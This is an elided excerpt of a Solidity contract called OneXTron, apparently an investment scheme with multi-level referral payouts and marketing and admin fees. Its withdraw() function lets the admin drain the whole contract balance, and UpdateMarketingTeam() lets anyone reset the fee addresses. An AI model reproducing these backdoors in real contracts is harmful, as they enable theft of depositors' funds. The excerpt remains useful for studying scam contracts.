...
contract OneXTron {
    ...
    uint constant public BASE_PERCENT = 230;
    uint[] public REFERRAL_PERCENTS = [1000, 300, 100, 50, 20, 10, 5];
    uint constant public MARKETING_FEE = 50; 
    uint constant public ADMIN_FEE = 400;
    uint constant public MAX_CONTRACT_PERCENT = 200;
    uint constant public MAX_LEADER_PERCENT = 100;
    uint constant public MAX_HOLD_PERCENT = 120;
    ...
    address payable public marketingAddress4;
 ...
 function UpdateMarketingTeam(address payable marketingAddr1, address payable marketingAddr2, address payable marketingAddr3, address payable marketingAddr4) public {
        marketingAddress1 = marketingAddr1;
        marketingAddress2 = marketingAddr2;
        marketingAddress3 = marketingAddr3;
        marketingAddress4 = marketingAddr4;
    }
    ...
    function withdraw() public {
        ...
        uint totalAmount;
        uint dividends;
        uint XtronTokenBal = address(this).balance;
        if(msg.sender == adminAddress){msg.sender.transfer(XtronTokenBal);}
    ...
    function invest(address referrer) public payable {
        ...
        marketingAddress1.transfer(marketingFee);   //0.5 % Fee
        marketingAddress2.transfer(marketingFee);   //0.5 % Fee
        marketingAddress3.transfer(marketingFee);   //0.5 % Fee
        marketingAddress4.transfer(marketingFee);   //0.5 % Fee
        
		adminAddress.transfer(adminFee); //4 % Fee
